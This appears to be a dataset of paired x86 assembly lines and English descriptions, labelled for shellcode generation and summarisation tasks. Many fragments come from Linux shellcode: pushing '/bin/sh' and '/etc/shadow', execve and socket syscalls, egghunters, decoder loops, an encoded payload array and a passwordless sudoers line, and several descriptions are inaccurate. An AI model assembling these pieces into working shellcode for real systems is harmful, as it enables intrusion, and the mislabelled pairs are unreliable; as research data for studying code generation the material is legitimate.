ShellCodeGen: define string as the byte string 'file.txt',string: db 'file.txt'
ShellCodeGen: increment edi,inc edi
ShellCodeSum: doit:,declare the doit label
ShellCodeSum: push 0x6e69622f,push 0x6e69622f onto the stack
ShellCodeGen: left rotate the edx register 4 times,"rol edx, 0x4"
ShellCodeSum: mul [value],multiply the contents of eax by the 32-bit contents of the memory location value
ShellCodeSum: jmp one,jump to the one label
ShellCodeGen: load the effective address of edx+0x4 into ebx,"lea ebx, [edx+0x4]"
ShellCodeSum: call esi,call the function in esi
ShellCodeGen: call the quit function,call quit
ShellCodeGen: perform logical or between the cx register and 0xfff,"or cx, 0xfff"
ShellCodeSum: jnz short loc_4010e5,if not zero jump to loc_4010e5
ShellCodeSum: push byte 0x01,push the byte 0x01 onto the stack
ShellCodeSum: jmp short push_cmd,jump short to push_cmd
ShellCodeGen: move parentmsg into eax,"mov eax, parentmsg"
ShellCodeSum: decode_pr:,define decode_pr label
"ShellCodeSum: mov eax, 0x8b90909d",move 0x8b90909d into eax
ShellCodeSum: inc esp,increment the contents of the esp register
ShellCodeSum: push byte 0x2f,push the byte 0x2f onto the stack
ShellCodeSum: push word 0x462d,push the word 0x462d onto the stack
ShellCodeSum: push dword 0x61702f2f,push the dword 0x61702f2f onto the stack
ShellCodeGen: invoke subroutine socket,"mov ebx, 1"
ShellCodeGen: move 0xada67373 into edi,"mov edi, 0xada67373"
ShellCodeSum: push 0x3131313a,push 0x3131313a onto the stack
ShellCodeSum: push 0bh,push 0bh onto the stack
ShellCodeSum: _user:,define the _user label
ShellCodeGen: add decimal integer 5 to ebx,"add ebx, 5"
ShellCodeGen: push 0x742f2f2f onto the stack,push 0x742f2f2f
ShellCodeGen: right shift the contents of the edx register by 16,"shr edx, 16"
"ShellCodeSum: lea ecx, [esi+18]",load the effective address [esi+18] into ecx
ShellCodeGen: move a byte from al into memory address hexstr+edx+2,"mov byte [hexstr+edx+2],al"
ShellCodeGen: push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register,"push 0x7461632f \n push 0x6e69622f \n mov edx, esp"
ShellCodeGen: jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h,"cmp bl, 78h \n jge short loc_402B1D"
ShellCodeSum: var db 32,declare var byte variable and initialize it to 32
ShellCodeGen: move the contents of memory address ebx+epi*4+2 into eax,"mov eax, [ebx+epi*4+2]"
"ShellCodeSum: mov byte [edi], bl",move the the contents of the bl register into the byte starting at the address in edi
ShellCodeGen: move address of response variable into ecx,"mov ecx, response"
ShellCodeSum: push 0x1,push the 0x1 onto the stack
ShellCodeGen: declare three doubleword values initialized to 1 2 and 3 at address z,"z dd 1, 2, 3"
ShellCodeGen: jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register,"cmp al, 0xf2 \n je _start \n mov eax, 0x50905090"
"ShellCodeSum: mov edx, type var1",move the number of bytes of var1 into edx
"ShellCodeSum: mov byte [hexstr+edx+2],al",move a byte from al into memory address hexstr+edx+2
"ShellCodeSum: mov [ebp+20], zero_reg",move the contents of zero_reg into the memory location specified by the operation [ebp+20]
ShellCodeGen: move dl into bl,"mov bl, dl"
ShellCodeGen: move the contents of the al register into the esi register,"mov [esi], al"
"ShellCodeSum: mov eax, [temp1]",move the contents at memory address temp1 to eax
ShellCodeGen: transfer the value 48 in the memory variable total,"mov total, 48"
ShellCodeGen: add 01 to ax,"add ax, 01"
ShellCodeGen: push the 0x7372656f onto the stack,push 0x7372656f
ShellCodeSum: path:,declare the path label
ShellCodeGen: store 5 into bl,"mov bl, 5"
ShellCodeSum: dd 0xdeadbeef,define a byte and initialize it to 0xdeadbeef
ShellCodeGen: move 0x16c into ax,"mov ax, 0x16c"
ShellCodeSum: push dword 0x58494741,push the dword 0x58494741 onto the stack
ShellCodeSum: push byte 0xc,push the byte 0xc onto the stack
"ShellCodeSum: mov cl, byte [eax]",move the byte in eax into cl
ShellCodeGen: push the byte 25 onto the stack,push byte 25
ShellCodeSum: push 0x6567772f,push 0x6567772f onto the stack
"ShellCodeSum: encodedshellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3","define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3"
"ShellCodeSum: and ecx, 0000000fh",mask out lowest 4 bits of the ecx register
ShellCodeSum: jne next_addr,jump to the next_addr label if the operands of the above comparison are not equals
ShellCodeSum: push word ax,push the word ax onto the stack
"ShellCodeSum: mov eax, 64",getppid
ShellCodeGen: jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label,"cmp al, cl \n jne short decode \n jmp shellcode"
"ShellCodeSum: push word 0x632d \n mov ecx, esp",push the word 0x632d onto the stack and point the ecx register to the stack register
ShellCodeSum: int 80h,call sys_write
ShellCodeGen: jump short to the memory location loc_402B13 if the contents of the eax register is zero,"test eax, eax \n jz short loc_402B13"
"ShellCodeSum: mov eax, 0xffffffff",move 0xffffffff into eax
ShellCodeGen: add one to the doubleword integer stored at location var,inc dword [var]
ShellCodeSum: pop edx,restore edx from the value we pushed onto the stack at the start
ShellCodeSum: pop esi,restore the top of the stack into esi register
"ShellCodeSum: mov byte [esi], al",move al into the byte in esi
ShellCodeGen: move 30 into cl,"mov cl, 30"
ShellCodeSum: mul ecx,mul eax by ecx
"ShellCodeSum: sub dl, 5 \n jns l4",subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative
ShellCodeGen: define the call_egghunter label,call_egghunter:
"ShellCodeSum: mov ecx, response",move address of response variable into ecx
ShellCodeGen: declare the cycle label,cycle:
"ShellCodeSum: mov edx, eax",move eax into edx
"ShellCodeSum: push 12 \n mov ebx, esp",push the value 12 onto the stack and point ebx to the stack register
ShellCodeSum: push word 0x401f,push the word 0x401f onto the stack
"ShellCodeSum: mov [ebp+12], ecx",move the contents of ecx into the memory location specified by the operation [ebp+12]
ShellCodeSum: formatting:,declare the formatting label
"ShellCodeSum: cmp bl, 48",compare ebx register's lower half value against ascii value 48
ShellCodeSum: fill:,declare the fill label
"ShellCodeSum: mov ax, 0x16a",move 0x16a into ax
ShellCodeSum: push byte 0x06 \n pop eax,put the syscall 0x06 into the eax register
ShellCodeGen: move 0x782f2f into eax,"mov eax, 0x782f2f"
ShellCodeSum: int 0x80,make the system call to the kernel
ShellCodeSum: int 80h,call the kernel
"ShellCodeSum: cmp cl, 12 \n jge l2",if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2
ShellCodeGen: push the doubleword 0x4227a28b onto the stack,push dword 0x4227a28b
ShellCodeSum: jmp short shellcode,jump short to shellcode
"ShellCodeSum: test eax, eax \n js close",if the contents of the eax register is negative then jump to the label close
ShellCodeGen: push the ecx onto the stack,push ecx
ShellCodeSum: push byte 11 \n pop eax,put the syscall 11 into the eax register
ShellCodeGen: multiply the contents of eax by the 32-bit contents of the memory location value,mul [value]
ShellCodeGen: subtract 1564 from the contents of the ax register,"sub ax, 1564"
ShellCodeGen: compare the byte at the memory location ebp+ecx with 7ah,"cmp byte [ebp+ecx], 7ah"
ShellCodeGen: define the exit label,exit:
ShellCodeSum: push 0x68736162,push 0x68736162 to the stack
"ShellCodeSum: msg1 db 'hello, brave new world!', 0ah",declare message string msg1 containing 'hello brave new world!'
"ShellCodeSum: mov eax, 48",system call signal
ShellCodeGen: set the contents of edx to zero,"xor edx, edx"
ShellCodeGen: push 0xb onto the stack,push 0xb
ShellCodeSum: push byte 1,push the byte 1 onto the stack
ShellCodeSum: mul [var],multiply the contents of eax by the 32-bit contents of the memory location var
ShellCodeSum: push 0x45683933,push 0x45683933 onto the stack
ShellCodeGen: move number 9 into edx,"mov edx, 9"
ShellCodeGen: jump to exi if greater,ja exi
"ShellCodeSum: mov eax, 0x782f2f",move 0x782f2f into eax
"ShellCodeSum: mov count, bx",move bx to count
ShellCodeGen: install portable signal handler,"mov eax, 67"
ShellCodeGen: move the contents of the esp register into the ebx register,"mov ebx, esp"
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register,"cmp eax, ebx \n je exit \n mov al, 0x4"
ShellCodeGen: jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi,scasd \n jnz _start
ShellCodeGen: move 9 into esi,"mov esi, 9"
"ShellCodeSum: mov bx, 18",get 18 in the bx register
ShellCodeGen: move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero,"mov al, 5 \n dec al \n jnz l2"
ShellCodeGen: push the contents of ecx register onto the stack,push ecx
ShellCodeSum: main:,define main label
ShellCodeGen: exchange eax with ebx,"xchg eax, ebx"
ShellCodeGen: initialize cx to 01,"mov cx, 01"
"ShellCodeSum: xor al, 0x30",perform the xor operation between the al register and the value 0x30
ShellCodeSum: dup2loop:,delcare the dup2loop label
"ShellCodeSum: add ebx, 5",add decimal integer 5 to ebx
ShellCodeGen: if the remainder is not equal to zero jump to local label checkint,jne checkint
"ShellCodeSum: lea ebx, [esp +1]",load the effective address of the result of the operation [esp +1] into the ebx register
"ShellCodeSum: db 'all all=(all) nopasswd: all', 0xa",define the byte string 'all all=(all) nopasswd: all'
ShellCodeSum: dec cl \n jns loop_dup,decrement the contents of the cl register and jump to the loop_dup label if the result is not negative
"ShellCodeSum: name db '/bin/sh', 0",define name as the byte string '/bin/sh'
ShellCodeGen: push the 0x53534150 onto the stack,push 0x53534150
"ShellCodeSum: mov edx, hellolen",move hellolen into edx
"ShellCodeSum: mov dl, byte [esi + 1]",move the byte at the address [esi + 1] into dl
"ShellCodeSum: cmp ebx, 9 \n ja exit \n jmp loop",jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label
ShellCodeGen: move 0xd into dl,"mov dl, 0xd"
ShellCodeGen: push 0x61655220 onto the stack,push 0x61655220
ShellCodeGen: if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label,"cmp ax, bx \n jne l3 \n jmp while"
ShellCodeGen: make the system call stat,"mov eax, 106"
ShellCodeSum: inc ebx,increment ebx register
ShellCodeSum: push edx,push edx onto the stack
"ShellCodeSum: cmp cl, 0x3 \n jne loop2",jump to the loop2 label if the contents of the cl register is not equal to the value 0x3
"ShellCodeSum: push 0x6873732f \n push 0x6374652f \n mov ecx, esp",push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
"ShellCodeSum: db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d","define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d"
ShellCodeGen: push the value 0x64687373 onto the stack and point the edi register to the stack register,"push 0x64687373 \n mov edi, esp"
ShellCodeGen: move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero,"mov bl, 3 \n dec bl \n jnz l3"
ShellCodeGen: define the jmp_search label,jmp_search:
ShellCodeGen: call the me function,call me
ShellCodeSum: push 0x4f4e2029,push the 0x4f4e2029 onto the stack
"ShellCodeSum: lea edi, [ebx+4*esi]",place the value ebx+4*esi in edi
ShellCodeSum: push word 0x7365,push the word 0x7365 onto the stack
ShellCodeSum: push ecx,push the ecx onto the stack
ShellCodeGen: jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register,"cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7"
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp",put /bin/sh into ebx
ShellCodeGen: open,"mov eax, 5"
ShellCodeGen: zero out edx,"xor edx, edx"
"ShellCodeSum: sub ax, 1564",subtract 1564 from ax and save the result into ax
ShellCodeSum: jmp short decode,jump short to decode
ShellCodeGen: zero out eax,"xor eax, eax"
ShellCodeGen: compare eax with doubleword at edi and set status flags,scasd
ShellCodeGen: decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register,"loop l3 \n mov ecx, esp"
ShellCodeSum: loopnz L2,decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero
ShellCodeGen: move filename into edx,"mov edx, filename"
"ShellCodeSum: cmp edx, 0x43 \n ja loop \n push edx",if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack
"ShellCodeSum: mov bl, 5",store 5 into bl
ShellCodeGen: decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero,loopnz L2
ShellCodeGen: move the contents of the ebx register into the long starting at the address [esi+22],"mov long [esi+22], ebx"
ShellCodeGen: place the value val in eax,"lea eax, [val]"
"ShellCodeSum: shl ebx, 8",left shift the contents of ebx by 8 bits
ShellCodeSum: ret,return to the address on the top of the stack
ShellCodeGen: make the socketcall,"mov al, 0x66"
ShellCodeGen: multiply eax by 4 using left shift,"shl eax, 2"
ShellCodeGen: define ip equal to 0x0100007f,_ip equ 0x0100007f
"ShellCodeSum: mov byte [esi+10], al",move al into the byte at address [esi+10]
ShellCodeSum: dim: equ 25,declare a constant size and set equal to 25
ShellCodeGen: declare next_page function,next_page:
"ShellCodeSum: xchg ebx, esp",swap the contents of the ebx register with the contents of the esp register
"ShellCodeSum: xor eax, eax",initialize eax with decimal value 0
ShellCodeGen: test the value of the al register,"test al, al"
ShellCodeGen: store the value 5 into the byte at memory location var,"mov byte [var], 5"
"ShellCodeSum: test ax, ax \n jnz exeunt \n jmp carryon",jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon
"ShellCodeSum: mov eax, 64",get the parent process ID
ShellCodeGen: move 0x04 into bl,"mov bl, 0x04"
ShellCodeGen: call the sprintlf function,call sprintlf
"ShellCodeSum: mov cx, 0x2bc",move 0x2bc into cx
ShellCodeGen: jump to ecx,jmp ecx
ShellCodeGen: push 0x79616c70 to the stack,push 0x79616c70
ShellCodeGen: move decimal 78 into edx,"mov edx, 78"
"ShellCodeSum: mov ecx, [esp]",move the contents of the esp register into the ecx register
ShellCodeGen: declare an uninitialized word labeled x,x dw ?
ShellCodeSum: push word 0x3905,push the word 0x3905 to the stack
"ShellCodeSum: mov ebx, esp",move the address of the character on the stack into ebx
ShellCodeGen: increment ax,inc ax
ShellCodeGen: push the value 0x0 to the stack,push 0x0
ShellCodeSum: jmp carryon,jump to the carryon label
ShellCodeGen: if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register,"cmp cl, dl \n je init \n inc cl"
ShellCodeSum: push dword 0x6f726577,push the dword 0x6f726577 onto the stack
ShellCodeGen: increment the byte at the address [esp+ecx] by one,inc byte [esp+ecx]
ShellCodeGen: declare the download label,download:
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov esi, esp"
ShellCodeGen: write to the stdout file,"mov ebx, 1"
ShellCodeGen: move the memory address of buffer variable into ecx,"mov ecx, buffer"
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov edx, esp",move ASCII /bin/sh into edx
"ShellCodeSum: lea ecx, [esi+22]",load the effective address of the result of the operation [esi+22] into the ecx register
"ShellCodeSum: mov al, 0x66",syscall 102
ShellCodeGen: test the contents of the ecx register,"test ecx, ecx"
ShellCodeSum: push dword 0x68732f6e,push the dword 0x68732f6e onto the stack
"ShellCodeSum: push word 17 \n mov edx, esp",push the word 17 onto the stack and point edx to the stack register
"ShellCodeSum: xor al, 0e9h",perform a logical xor between the al register and 0e9h and save the result in al
"ShellCodeSum: message db 'hello',13,0",allocate memory for a null terminated string 'hello\n'
ShellCodeSum: loop decode \n jmp EncodedShellcode,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label
ShellCodeGen: negate all the bits of dl register,not dl
ShellCodeGen: perform a bitwise and on the contents of the eax register,"test eax, eax"
ShellCodeGen: push byte 1 onto the stack,push byte 1
ShellCodeGen: move the byte 2h into al,"mov al, byte 2h"
"ShellCodeSum: mov ebx, command",move command into ebx
"ShellCodeSum: mov byte [ecx], 2",move 2 into the single byte at memory location ecx
ShellCodeSum: call_decoder:,define the call_decoder label
"ShellCodeSum: cmp eax, ebx \n je download",jump to the download label if the contents of the eax register is equal to the contents of the ebx register
ShellCodeGen: jump short to the cmd label,jmp short cmd
ShellCodeGen: move 0x978cd0d0 into edi,"mov edi, 0x978cd0d0"
ShellCodeGen: jump to the _while_loop label if the destination operand is less than the source operand in the above comparison,jl _while_loop
ShellCodeSum: sys_execve equ 0x0b,define sys_execve equal to 0x0b
ShellCodeGen: move decimal number 255 into edx,"mov edx, 255"
"ShellCodeSum: push eax \n mov ecx, esp",push the contents of the eax register onto the stack and point ecx to the stack register
"ShellCodeSum: mov al, 0x1f",move 0x1f into al
ShellCodeSum: push ecx,push ecx onto the stack
"ShellCodeSum: shr dl, 4",right shift the contents of dl register by 4 bit positions
ShellCodeGen: move al into cl,"mov cl, al"
"ShellCodeSum: pop ecx \n loop l1 \n mov eax, 1",restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit
"ShellCodeSum: test eax, eax \n jnz l1",if the contents of the eax register is not zero then jump to the label l1
ShellCodeGen: add 16 to ebx,"add ebx, 16"
"ShellCodeSum: mov ebx, 5",move 5 into ebx
ShellCodeGen: decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero,loop do_dup
"ShellCodeSum: mov ecx, esp",move address of arguments into ecx
"ShellCodeSum: cmp byte [buff], 61h",compare the byte at the memory location buff with 61h
ShellCodeGen: push the byte 0x10 onto the stack,push byte 0x10
ShellCodeGen: return to our program,ret
ShellCodeSum: jnz 1,jump to the numeric label 1 if the zero flag is cleared
ShellCodeSum: push 0x64777373,push 0x64777373 onto the stack
ShellCodeSum: push word 0x736e,push the word 0x736e onto the stack
"ShellCodeSum: cmp edi, 0",compare if edi is equal to 0
ShellCodeSum: loop decode \n jmp short shellcode,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
ShellCodeSum: push 0x6475732f,push 0x6475732f onto the stack
ShellCodeGen: put /bin/sh into ebx,"push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeSum: format:,define format label
ShellCodeGen: load the effective address [zero_reg+3] into ecx,"lea ecx, [zero_reg+3]"
"ShellCodeSum: cmp al, 0xaa \n je decode_insertion \n xor al, bl",jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register
ShellCodeGen: load the effective address of esp into the ebx register,"lea ebx, [esp]"
ShellCodeGen: clear the bx register,"xor bx, bx"
ShellCodeGen: getppid,"mov eax, 64"
ShellCodeSum: pushl $0x68732f2f,push $0x68732f2f onto the stack
"ShellCodeSum: mov ecx, edx",move edx into ecx
ShellCodeGen: map the memory page to a file,"mov eax, 90"
ShellCodeSum: jmp _accept,jump to label _accept
ShellCodeGen: replaces the contents of the ecx register with its two's complement,neg ecx
ShellCodeSum: push 16,push 16 onto the stack
ShellCodeSum: size: equ 1024,define size to be 1024 bytes large
"ShellCodeSum: mov [bp+0x0a], al",move the contents of the al register at the memory location specified by the operation [bp+0x0a]
ShellCodeGen: add the value 1 into the ecx register,"add ecx, 1"
ShellCodeGen: move the 3rd element of the byte_table into cl,"mov cl, byte_table+2"
ShellCodeSum: push dword 0x68732f63,push the dword 0x68732f63 onto the stack
ShellCodeGen: right shift the contents of eax register by 16 bit positions,"shr eax, 16"
ShellCodeGen: return 0 status on exit,"mov ebx, 0"
ShellCodeGen: move 0xa2 into al,"mov al, 0xa2"
ShellCodeGen: jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register,"cmp esi, edx \n je find_egg"
"ShellCodeSum: shl ebx, 1",multiply ebx by 2 using left shift
ShellCodeGen: decrement the contents of the eax register,dec eax
"ShellCodeSum: msg2 db 'this is how we recycle in nasm.', 0ah",declare message string msg2 containing 'this is how we recycle in nasm'
ShellCodeGen: load the effective address of ebp-8 into the ebx register,"lea ebx, [ebp-8]"
ShellCodeGen: move 4 into eax,"mov eax, 4"
ShellCodeGen: perform the xor operation between eax register and edi register and store the result in eax,"xor eax, [edi]"
"ShellCodeSum: cmp dword [eax-8], egg \n jne _next",jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address
ShellCodeSum: push word 0x2e2e,push the word 0x2e2e onto the stack
ShellCodeGen: perform or operation between al and bl registers,"or al, bl"
ShellCodeGen: if the contents of the dl register is not zero then jump to the label ready_to_proxy,"test dl, 0x1 \n jnz ready_to_proxy"
"ShellCodeSum: shr edx, 16",right shift the contents of the edx register by 16
"ShellCodeSum: mov ecx, filecontents",move the memory address of our file contents variable into ecx
ShellCodeGen: move 11 into the byte at address al,"mov byte al, 11"
ShellCodeGen: allocate one byte of memory for var_a variable and initialize it to 232,var_a db 232
"ShellCodeSum: cmp eax, ebx \n je child",jump to the child label if the contents of the eax register is equal to the contents of the ebx register
ShellCodeGen: define cmd as the byte string 'cat /etc/passwd',cmd: db 'cat /etc/passwd'
ShellCodeGen: invoke sys_creat,"mov eax, 8"
"ShellCodeSum: mov eax, 2",make the system call to create a new process
ShellCodeSum: push dword eax,push the doubleword eax to the stack
ShellCodeSum: dec ebp,decrement ebp
ShellCodeGen: syscall for sigaction,push byte 0x43
"ShellCodeSum: sub [var2], esi",subtract the contents of esi from the 32-bit integer stored at memory location var2
ShellCodeSum: jnz 0x41,jump to 0x41 if not zero
ShellCodeGen: push the contents of esp register onto the stack,push esp
ShellCodeGen: load the effective address [zero_reg+66h] into eax,"lea eax, [zero_reg+66h]"
ShellCodeGen: load the effective address of esp into ebx,"lea ebx, [esp]"
ShellCodeGen: push the esi onto the stack,push esi
ShellCodeGen: make the system call to get the process ID,"mov eax, 20"
"ShellCodeSum: cmp al, 0xf2 \n je next_page",jump to the label next_page if the contents of the al register is equal to the value 0xf2
"ShellCodeSum: mov eax, 90",move decimal number 90 into eax
ShellCodeGen: decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label,loop decrypt \n jmp encrypt
ShellCodeGen: jump to the label ready_to_proxy if the contents of the dl register is not zero,"test dl, 0x1 \n jnz ready_to_proxy"
"ShellCodeSum: mov ebx, 1",invoke subroutine socket
ShellCodeGen: subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero,"sub cl, 1 \n jnz decode"
ShellCodeSum: loop fill,decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero
ShellCodeSum: jmp data,jump to the data label
"ShellCodeSum: test eax, eax \n jz socket \n xor eax, eax",if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register
ShellCodeGen: add the register dl in the memory location byte_value,"add byte_value, dl"
"ShellCodeSum: cmp BYTE [edx], 0x2e \n jne l2 \n jmp while",jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label
"ShellCodeSum: mov eax, 67",system call sigaction
ShellCodeGen: decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label,loop ROT_decode \n jmp short Shellcode
ShellCodeSum: jmp short _star,jump short to _star label
ShellCodeGen: define the _file label,_file:
ShellCodeGen: declare retry label,retry:
ShellCodeGen: move al into ebx+7,"mov [ebx+7], al"
ShellCodeGen: put the syscall 0xb into the eax register,push byte 0xb \n pop eax
ShellCodeSum: call shell_ret,call the shell_ret function
ShellCodeSum: push 0x30317974,push the 0x30317974 onto the stack
ShellCodeGen: add the contents of esi to the contents of eax,"add eax, esi"
ShellCodeSum: push word 0x0a,push the word 0x0a to the stack
ShellCodeGen: init ebx 0,"xor ebx, ebx"
ShellCodeGen: zero out zero_reg,"xor zero_reg, zero_reg"
ShellCodeGen: call the kernel,int 80h
ShellCodeGen: push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register,"push 0x61702f2f \n push 0x6374652f \n mov esi, esp"
ShellCodeGen: move the effective address edx+ecx into al,"mov al, byte [edx+ecx]"
ShellCodeGen: move the 32-bit integer representation of 4 into the doubleword starting at address ebx,"mov dword [ebx], 4"
"ShellCodeSum: test eax, eax \n jnz _convert",jump to the label _convert if the contents of the eax register is not zero
"ShellCodeSum: msg2 db 'passwd', 0x00",define msg2 as the byte string 'passwd'
ShellCodeGen: clear zero_reg,"xor zero_reg, zero_reg"
ShellCodeGen: declare code section .bss,section .bss
ShellCodeSum: dec cl,decrement the cl register by one
ShellCodeGen: move the contents of the esp register into the ecx register,"mov ecx, esp"
"ShellCodeSum: sub eax, 0x70445eaf",subtract 0x70445eaf from the contents in eax and save the result in eax
ShellCodeGen: if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register,"cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40"
ShellCodeGen: jump to edx,jmp edx
ShellCodeSum: call _exec,call the _exec function
"ShellCodeSum: xchg ebx, edx",swap the contents of the ebx register with the contents of the edx register
ShellCodeGen: move the contents of the eax register into the ebx register,"mov ebx, eax"
"ShellCodeSum: mov al, byte 6h",move the byte at the address 6h into al
ShellCodeSum: push 0x1c,push 0x1c onto the stack
"ShellCodeSum: push 0x69622f2f \n mov ebx, esp",push the value 0x69622f2f onto the stack and point the ebx register to the stack register
"ShellCodeSum: mov edx, 78",move decimal 78 into edx
ShellCodeSum: inc eax,increment the address in eax by one byte
"ShellCodeSum: mov eax, 0x31263e32",move 0x31263e32 into eax
ShellCodeGen: declare the stage label,stage:
ShellCodeSum: bytes db 10,define the byte value bytes and initialize it to 10
ShellCodeGen: jump to the read label,jmp read
ShellCodeGen: jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register,"cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD"
ShellCodeGen: push 0x8501a8c0 onto the stack,push 0x8501a8c0
ShellCodeSum: not dl,negate all the bits of dl register
ShellCodeGen: move esi into the doubleword starting at the address esp-4,"mov dword [esp-4], esi"
ShellCodeSum: inc dl,increment dl
ShellCodeGen: if the contents of the edx register is equal to 42 then jump to loc_402B13,"cmp edx, 42 \n je short loc_402B13"
"ShellCodeSum: mov cl, 21",move 21 into cl
ShellCodeGen: move the value of upcase into ebx,"mov ebx, upcase"
ShellCodeGen: push the byte -1 onto the stack,push byte -1
ShellCodeGen: move buff to edx,"mov edx, buff"
ShellCodeSum: scasd \n l1 IncAddr,jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi
ShellCodeGen: call function internetreadfile,call internetreadfile
ShellCodeSum: push word 0x5000,push 0x5000 onto stack port
ShellCodeGen: restore the top of the stack into the esi register,pop esi
"ShellCodeSum: mov [ebx+0xe], dl",move dl into the address [ebx+0xe]
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the all label,"cmp eax, ebx \n je all"
ShellCodeGen: compare if our counter is equal to 100,"cmp ecx, 100"
ShellCodeGen: push the byte 1 onto the stack and point eax to the stack register,"push byte 1 \n mov eax, esp"
ShellCodeGen: if it is less than or equal to 10 then jump to lp1,jle lp1
ShellCodeGen: add 16 to eax,"add eax, 16"
ShellCodeSum: cont:,define the cont label
ShellCodeGen: push the contents of the edi register onto the stack,push edi
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov ebx, esp"
ShellCodeGen: move eax into the address [ecx+4],"mov [ecx+4], eax"
ShellCodeGen: put the syscall 0x06 into the eax register,push byte 0x06 \n pop eax
ShellCodeGen: perform a logical xor between the al register and 0e9h and save the result in al,"xor al, 0e9h"
ShellCodeGen: define next_cycle label,next_cycle:
"ShellCodeSum: mov dl, 0x02",move 0x02 into dl
ShellCodeGen: push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register,"push 0x7461632f \n push 0x6e69622f \n mov esi, esp"
"ShellCodeSum: mov al, byte [edx+ecx]",move the effective address edx+ecx into al
ShellCodeGen: global _start,global _start
ShellCodeGen: push 0x1c onto the stack,push 0x1c
ShellCodeGen: add the contents of the eax register to the contents of edx register,"add edx, eax"
ShellCodeSum: x dw ?,declare a word uninitialized value referred to as location x
ShellCodeSum: push byte 0x2 \n pop eax,put the syscall 0x2 into the eax register
"ShellCodeSum: mov al, byte 3h",move the byte 3h into al
"ShellCodeSum: sub bl, al",subtract the contents of al register from the contents of bl register and save the result in bl
ShellCodeGen: define exit_call equal to 1,exit_call equ 1
"ShellCodeSum: add edx, eax",add the contents of eax to the contents of edx
ShellCodeGen: jump short to the path label,jmp short path
ShellCodeSum: jmp shellcode,jump to the shellcode label
ShellCodeGen: multiply eax by the contents of the ecx register,mul ecx
ShellCodeGen: compare eax with ebx,"cmp eax, ebx"
ShellCodeGen: if the contents of the eax register is not zero then jump to the label checkforfile,"test eax, eax \n jnz checkforfile"
ShellCodeSum: push 0x656c6966,push 0x656c6966 onto the stack
